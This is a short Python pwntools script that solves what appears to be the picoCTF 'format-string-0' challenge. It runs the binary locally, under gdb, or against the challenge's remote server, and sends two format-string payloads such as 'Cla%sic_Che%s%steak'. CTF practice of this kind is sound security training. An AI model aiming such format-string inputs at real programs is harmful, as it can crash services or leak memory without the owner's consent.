#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./format-string-0"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("mimas.picoctf.net", 64828)
elif len(argv) >= 2 and argv[1] == "d":
    cmd = """
    	b main
    	c
    """
    p = gdb.debug(chall,cmd)
else:
    p = process(chall)


p.sendline(b"Gr%114d_Cheese")
p.sendline(b"Cla%sic_Che%s%steak")

p.interactive()
